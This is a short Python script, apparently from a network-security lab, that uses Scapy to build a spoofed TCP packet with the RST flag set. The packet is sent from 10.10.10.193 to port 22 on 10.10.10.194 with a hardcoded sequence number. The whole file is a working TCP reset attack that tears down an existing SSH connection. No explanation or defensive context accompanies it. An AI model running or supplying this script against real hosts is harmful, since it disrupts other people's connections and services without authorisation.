import sys
from scapy.all import *

print("sending reset packet...")
IPLayer = IP (src="10.10.10.193", dst = "10.10.10.194")
TCPLayer = TCP (sport=41860, dport=22, flags="R", seq=3261564974)
pkt=IPLayer/TCPLayer
ls(pkt)
send(pkt,verbose=0)
